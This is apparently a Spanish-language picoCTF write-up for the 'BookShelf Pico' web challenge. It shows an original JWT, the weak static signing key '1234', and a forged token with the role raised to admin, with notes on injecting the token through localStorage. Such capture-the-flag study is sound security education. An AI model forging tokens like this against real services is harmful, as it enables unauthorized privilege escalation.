## Descripción

BookShelf Pico, my premium online book-reading service.

I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!

Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/483/bookshelf-pico.zip).

Website can be accessed [here!](http://saturn.picoctf.net:53879/).
## Solución

**Solución 1
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc3OTU4MTE4NSwiaWF0IjoxNzc4OTc2Mzg1LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.92s3tHrcRu0wgX8I1tg3GIP4m42YPukXAx73qAO4Q8E

El SECRET_KEY es:1234

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiYWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3Nzk1ODExODUsImlhdCI6MTc3ODk3NjM4NSwidXNlcklkIjoxLCJlbWFpbCI6InVzZXIifQ.1P0GgiCfWKYzEd6_iBBnPffoW9t-kMk0omE7_6Glh8s



```

#### NOTAS
Escalación de privilegios mediante manipulación de JWT explotando una clave secreta estática (`1234`) por una mala implementación de aleatoriedad en el backend (`SecretGenerator.java`). **Solución:** Se forjó un token modificando los _claims_ a `role: admin` e `userId: 1`, firmándolo con la clave expuesta e inyectándolo en el `localStorage` vía consola para evadir validaciones del frontend.

